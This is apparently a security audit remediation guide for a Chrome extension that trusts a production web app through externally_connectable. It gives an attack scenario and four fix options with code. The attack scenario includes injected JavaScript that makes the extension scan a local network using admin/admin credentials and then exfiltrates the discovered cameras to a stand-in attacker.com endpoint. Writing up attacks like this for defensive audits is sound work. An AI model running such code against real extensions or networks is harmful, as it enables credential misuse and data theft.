# MEDIUM #10: External Web App in externally_connectable - Fix Guide

**Vulnerability ID**: MEDIUM #10
**Severity**: MEDIUM (Risk Score: 6/10)
**Status**: NOT YET IMPLEMENTED
**Implementation Difficulty**: MEDIUM (requires web app changes)
**Estimated Time**: 2-4 hours

---

## 📋 Executive Summary

Your Chrome extension currently allows the **production web app** (`https://anava-ai.web.app`) to directly communicate with the extension. If the web app is compromised (via XSS, supply chain attack, or account takeover), attackers can:

- Control the Chrome extension
- Access the local proxy server
- Scan the user's local network for cameras
- Extract camera credentials
- Modify camera configurations

**Current Code** (`manifest.json:13-19`):
```json
"externally_connectable": {
  "matches": [
    "http://localhost:5173/*",      // ✅ Safe (local dev)
    "http://localhost:3000/*",      // ✅ Safe (local dev)
    "https://anava-ai.web.app/*"   // ⚠️ RISKY (production web app)
  ]
}
```

**Current Code** (`background.js:7-11`):
```javascript
const ALLOWED_ORIGINS = [
  'http://localhost:5173',
  'http://localhost:3000',
  'https://anava-ai.web.app'  // ⚠️ External website allowed
];
```

---

## 🎯 Attack Scenario

### Step-by-Step Attack Flow

1. **Web App Compromise**
   - Attacker finds XSS vulnerability in `anava-ai.web.app`
   - OR attacker compromises Firebase hosting account
   - OR attacker exploits dependency vulnerability (supply chain)

2. **Malicious JavaScript Injection**
   ```javascript
   // Attacker's malicious code on anava-ai.web.app
   chrome.runtime.sendMessage(
     'YOUR_EXTENSION_ID',
     {
       command: 'scan_network',
       payload: {
         subnet: '192.168.1.0/24',
         credentials: { username: 'admin', password: 'admin' }
       }
     },
     (response) => {
       // Send discovered cameras to attacker's server
       fetch('https://attacker.com/exfiltrate', {
         method: 'POST',
         body: JSON.stringify(response.data.cameras)
       });
     }
   );
   ```

3. **Extension Executes Attack**
   - Extension receives message from `anava-ai.web.app`
   - Origin check passes (it's in `ALLOWED_ORIGINS`)
   - Extension scans local network via proxy
   - Returns camera list to malicious JavaScript
   - Attacker exfiltrates data

4. **Lateral Movement**
   - Attacker deploys malicious ACAP to cameras
   - Gains persistent access to customer networks
   - Pivots to other devices on network

---

## 🛡️ Solution Options

### Option 1: Remove External Web App (RECOMMENDED)

**Security Level**: ⭐⭐⭐⭐⭐ (Best)
**Implementation Effort**: MEDIUM
**Breaking Changes**: YES (requires web app redesign)

**Changes Required**:

#### 1.1 Update `manifest.json`
```json
"externally_connectable": {
  "matches": [
    "http://localhost:5173/*",
    "http://localhost:3000/*"
    // REMOVED: "https://anava-ai.web.app/*"
  ]
}
```

#### 1.2 Update `background.js`
```javascript
const ALLOWED_ORIGINS = [
  'http://localhost:5173',
  'http://localhost:3000'
  // REMOVED: 'https://anava-ai.web.app'
];
```

#### 1.3 Alternative Communication Methods

**Method A: User Copies Extension ID**
```javascript
// In extension popup (popup.js)
document.getElementById('copy-extension-id').addEventListener('click', () => {
  navigator.clipboard.writeText(chrome.runtime.id);
  alert('Extension ID copied! Paste into web app.');
});
```

**Method B: Web App Communicates via Proxy Server**
```javascript
// In web app (instead of chrome.runtime.sendMessage)
async function scanNetwork(subnet, credentials) {
  // Direct HTTP request to proxy server (no extension messaging)
  const response = await fetch('http://127.0.0.1:9876/scan-network', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ subnet, credentials })
  });
  return response.json();
}
```

Then add new endpoint in `proxy-server/main.go`:
```go
http.HandleFunc("/scan-network", handleScanNetwork)

func handleScanNetwork(w http.ResponseWriter, r *http.Request) {
    // CORS validation still applies
    if !setCORSHeaders(w, r) {
        return
    }

    // Implement network scanning logic
    // ... (similar to background.js scan logic)
}
```

**Method C: Extension Provides Configuration UI**
```
┌─────────────────────────────────────┐
│  Chrome Extension Popup             │
│                                     │
│  [Camera Deployment]                │
│                                     │
│  Network: 192.168.1.0/24            │
│  Username: [______]                 │
│  Password: [______]                 │
│                                     │
│  [Start Scan]                       │
│                                     │
│  Found 3 cameras:                   │
│  • 192.168.1.10 (AXIS M3045)        │
│  • 192.168.1.11 (AXIS P1375)        │
│  • 192.168.1.12 (AXIS Q1615)        │
│                                     │
│  [Deploy to All]                    │
└─────────────────────────────────────┘
```

---

### Option 2: Add Message Signing (MEDIUM Security)

**Security Level**: ⭐⭐⭐ (Moderate)
**Implementation Effort**: HIGH
**Breaking Changes**: YES (web app must sign messages)

**Implementation**:

#### 2.1 Generate Shared Secret
```bash
# Generate 256-bit secret key
openssl rand -hex 32 > extension-secret.key
# Output: a1b2c3d4e5f6...
```

Store in:
- Extension: Hardcoded in `background.js` (or fetch from secure endpoint)
- Web App: Environment variable `VITE_EXTENSION_SECRET`

#### 2.2 Web App Signs Messages
```javascript
// In web app
async function signMessage(message, secret) {
  const encoder = new TextEncoder();
  const key = await crypto.subtle.importKey(
    'raw',
    encoder.encode(secret),
    { name: 'HMAC', hash: 'SHA-256' },
    false,
    ['sign']
  );

  const signature = await crypto.subtle.sign(
    'HMAC',
    key,
    encoder.encode(JSON.stringify(message))
  );

  return Array.from(new Uint8Array(signature))
    .map(b => b.toString(16).padStart(2, '0'))
    .join('');
}

// Send signed message
const message = {
  command: 'scan_network',
  payload: { subnet: '192.168.1.0/24', credentials: {...} },
  timestamp: Date.now()
};

const signature = await signMessage(message, EXTENSION_SECRET);

chrome.runtime.sendMessage(EXTENSION_ID, {
  ...message,
  signature
}, callback);
```

#### 2.3 Extension Validates Signature
```javascript
// In background.js
const SHARED_SECRET = 'a1b2c3d4e5f6...'; // From extension-secret.key

async function verifySignature(message, signature) {
  const { signature: _, ...messageWithoutSig } = message;

  const encoder = new TextEncoder();
  const key = await crypto.subtle.importKey(
    'raw',
    encoder.encode(SHARED_SECRET),
    { name: 'HMAC', hash: 'SHA-256' },
    false,
    ['verify']
  );

  const signatureBytes = new Uint8Array(
    signature.match(/.{2}/g).map(byte => parseInt(byte, 16))
  );

  const isValid = await crypto.subtle.verify(
    'HMAC',
    key,
    signatureBytes,
    encoder.encode(JSON.stringify(messageWithoutSig))
  );

  return isValid;
}

chrome.runtime.onMessageExternal.addListener(async (message, sender, sendResponse) => {
  // Origin check
  if (!ALLOWED_ORIGINS.includes(sender.origin)) {
    sendResponse({ success: false, error: 'Unauthorized origin' });
    return false;
  }

  // Signature check
  if (!message.signature) {
    sendResponse({ success: false, error: 'Missing signature' });
    return false;
  }

  const isValid = await verifySignature(message, message.signature);
  if (!isValid) {
    console.error('[SECURITY] Invalid message signature from', sender.origin);
    sendResponse({ success: false, error: 'Invalid signature' });
    return false;
  }

  // Timestamp check (prevent replay attacks)
  const age = Date.now() - message.timestamp;
  if (age > 60000) { // 1 minute
    sendResponse({ success: false, error: 'Message expired' });
    return false;
  }

  // Process message...
  // ... (existing code)
});
```

**Limitations**:
- ❌ Doesn't prevent XSS on web app (attacker can steal secret)
- ❌ Secret must be distributed securely
- ✅ Prevents third-party sites from spoofing messages
- ✅ Prevents replay attacks with timestamp validation

---

### Option 3: Use postMessage Instead of externally_connectable (BETTER)

**Security Level**: ⭐⭐⭐⭐ (Good)
**Implementation Effort**: MEDIUM
**Breaking Changes**: YES (different API)

**Architecture**:
```
Web App
  ↓ Opens extension popup in hidden iframe
Extension Popup (iframe)
  ↓ window.postMessage() with origin validation
Web App receives response
```

#### 3.1 Remove `externally_connectable`
```json
// manifest.json - REMOVE THIS SECTION
// "externally_connectable": { ... }
```

#### 3.2 Web App Opens Extension Popup
```javascript
// In web app
async function communicateWithExtension(message) {
  // Open extension popup in hidden iframe
  const iframe = document.createElement('iframe');
  iframe.src = `chrome-extension://${EXTENSION_ID}/popup.html`;
  iframe.style.display = 'none';
  document.body.appendChild(iframe);

  // Wait for iframe to load
  await new Promise(resolve => {
    iframe.onload = resolve;
  });

  // Send message via postMessage
  return new Promise((resolve, reject) => {
    const timeout = setTimeout(() => {
      reject(new Error('Extension timeout'));
    }, 10000);

    window.addEventListener('message', function handler(event) {
      // Verify origin is extension
      if (!event.origin.startsWith('chrome-extension://')) {
        return;
      }

      clearTimeout(timeout);
      window.removeEventListener('message', handler);
      document.body.removeChild(iframe);
      resolve(event.data);
    });

    iframe.contentWindow.postMessage(message, '*');
  });
}

// Usage
const result = await communicateWithExtension({
  command: 'scan_network',
  payload: { subnet: '192.168.1.0/24', credentials: {...} }
});
```

#### 3.3 Extension Receives via postMessage
```javascript
// In popup.js (or dedicated message handler)
window.addEventListener('message', async (event) => {
  // Validate origin
  const ALLOWED_WEB_APP_ORIGINS = [
    'https://anava-ai.web.app',
    'http://localhost:5173'
  ];

  if (!ALLOWED_WEB_APP_ORIGINS.includes(event.origin)) {
    console.error('[SECURITY] Blocked message from', event.origin);
    return;
  }

  console.log('[Extension] Received message from', event.origin);

  // Process message
  try {
    const result = await processCommand(event.data);

    // Send response back
    event.source.postMessage({
      success: true,
      data: result
    }, event.origin);
  } catch (error) {
    event.source.postMessage({
      success: false,
      error: error.message
    }, event.origin);
  }
});
```

**Benefits**:
- ✅ Web app can't send messages unless user is actively using it
- ✅ Iframe provides some isolation
- ✅ Origin validation still works
- ✅ No `externally_connectable` needed

**Limitations**:
- ⚠️ Still trusts web app origin
- ⚠️ XSS on web app can still exploit this
- ⚠️ More complex implementation

---

## 🔒 Option 4: Add Content Security Policy to Web App

**Security Level**: ⭐⭐⭐⭐ (Good Defense-in-Depth)
**Implementation Effort**: LOW
**Breaking Changes**: NO (complementary measure)

**Implementation**:

Add to `anava-ai.web.app` hosting configuration (`firebase.json`):
```json
{
  "hosting": {
    "headers": [
      {
        "source": "**",
        "headers": [
          {
            "key": "Content-Security-Policy",
            "value": "default-src 'self'; script-src 'self' 'unsafe-inline' https://apis.google.com; connect-src 'self' https://*.googleapis.com https://*.cloudfunctions.net http://127.0.0.1:9876; img-src 'self' data: https:; style-src 'self' 'unsafe-inline'; frame-ancestors 'none'; base-uri 'self'; form-action 'self';"
          },
          {
            "key": "X-Frame-Options",
            "value": "DENY"
          },
          {
            "key": "X-Content-Type-Options",
            "value": "nosniff"
          },
          {
            "key": "Referrer-Policy",
            "value": "strict-origin-when-cross-origin"
          }
        ]
      }
    ]
  }
}
```

**Benefits**:
- ✅ Prevents inline script injection
- ✅ Restricts script sources to trusted domains
- ✅ Mitigates XSS attacks
- ✅ Easy to implement

**Limitations**:
- ❌ Doesn't eliminate risk if CSP is bypassed
- ❌ `'unsafe-inline'` still allows some XSS vectors

---

## 📊 Recommendation Matrix

| Option | Security | Effort | Breaking | Recommendation |
|--------|----------|--------|----------|----------------|
| **1. Remove Web App** | ⭐⭐⭐⭐⭐ | MEDIUM | YES | ✅ **BEST** |
| **2. Message Signing** | ⭐⭐⭐ | HIGH | YES | ⚠️ Moderate |
| **3. postMessage** | ⭐⭐⭐⭐ | MEDIUM | YES | ✅ Good |
| **4. CSP Headers** | ⭐⭐⭐⭐ | LOW | NO | ✅ **DO THIS NOW** |

---

## 🚀 Implementation Roadmap

### Phase 1: Immediate (This Week)
1. ✅ **Implement CSP headers on web app** (Option 4)
   - Low effort, high impact
   - No breaking changes
   - Reduces XSS risk significantly

### Phase 2: Short-term (Next Sprint)
2. **Evaluate architecture change** (Option 1 or 3)
   - Option 1: Remove `externally_connectable` entirely
   - Option 3: Switch to `postMessage` API
   - Requires web app redesign

### Phase 3: Long-term (Next Quarter)
3. **Implement defense-in-depth**
   - Add message signing (Option 2) as second layer
   - Implement Subresource Integrity (SRI) for web app assets
   - Add web app integrity monitoring
   - Implement anomaly detection for extension usage

---

## 🧪 Testing Checklist

### Before Implementation
- [ ] Document current web app → extension communication flows
- [ ] Identify all places where `chrome.runtime.sendMessage` is used
- [ ] Create test cases for each command type
- [ ] Set up staging environment

### After Implementation
- [ ] Verify web app can no longer send messages (if Option 1)
- [ ] Test alternative communication method works
- [ ] Verify CSP headers are present (Option 4)
- [ ] Test message signing validation (if Option 2)
- [ ] Check browser console for CSP violations
- [ ] Penetration test with simulated XSS attack

---

## 📁 Files to Modify

### Option 1 (Remove Web App)
```
anava-camera-extension/
├── manifest.json                    # Remove externally_connectable
├── background.js                    # Remove web app from ALLOWED_ORIGINS
└── proxy-server/main.go             # Add new endpoints for web app

anava-infrastructure-deployer/ (web app)
├── src/services/extensionBridge.ts  # New API for extension communication
└── src/pages/CameraDeployment.tsx   # Update to use new API
```

### Option 2 (Message Signing)
```
anava-camera-extension/
├── background.js                    # Add signature validation
└── extension-secret.key             # Store shared secret

anava-infrastructure-deployer/
└── src/services/extensionBridge.ts  # Add message signing
```

### Option 3 (postMessage)
```
anava-camera-extension/
├── manifest.json                    # Remove externally_connectable
├── popup.js                         # Add postMessage listener
└── background.js                    # Remove external message listener

anava-infrastructure-deployer/
└── src/services/extensionBridge.ts  # Use iframe + postMessage
```

### Option 4 (CSP - DO THIS NOW)
```
anava-infrastructure-deployer/
└── firebase.json                    # Add CSP headers
```

---

## 🎓 Additional Resources

- [Chrome Extension Security Best Practices](https://developer.chrome.com/docs/extensions/mv3/security/)
- [Content Security Policy Guide](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetsecurity.com/cheatsheets/cross-site-scripting-prevention)
- [Chrome externally_connectable Documentation](https://developer.chrome.com/docs/extensions/mv3/manifest/externally_connectable/)

---

## ❓ FAQ

**Q: Why is this only MEDIUM severity and not HIGH/CRITICAL?**
A: Because it requires **two factors** to exploit:
1. Compromise of `anava-ai.web.app` (under your control)
2. User having extension installed

**Q: Can I just add stricter origin validation?**
A: No. If the web app is compromised, the attacker controls the legitimate origin.

**Q: What if I just remove the production URL but keep localhost?**
A: ✅ **Perfect!** That's Option 1 and it's the recommended approach.

**Q: Will this break existing deployments?**
A: Option 1 (remove web app): YES - requires web app redesign
A: Option 4 (CSP): NO - just adds security headers

**Q: Can I implement Option 4 right now without breaking anything?**
A: ✅ **YES! DO THIS NOW.** It's quick and has no breaking changes.

---

## 📝 Summary

**What to do RIGHT NOW**:
1. Implement **Option 4 (CSP headers)** on web app - takes 10 minutes ✅
2. Plan architecture change for **Option 1** or **Option 3** - implement next sprint

**Long-term security posture**:
- Remove `https://anava-ai.web.app` from `externally_connectable`
- Move to proxy server API or postMessage communication
- Add CSP, SRI, and integrity monitoring
- Implement message signing as defense-in-depth

**Impact**:
- Current: 🔴 Web app compromise = full extension control
- After CSP: 🟡 Web app compromise harder (but still possible)
- After removal: 🟢 Web app compromise cannot control extension

---

**Document Version**: 1.0
**Last Updated**: October 29, 2025
**Author**: Security Audit Team
**Next Review**: Before implementing architecture changes
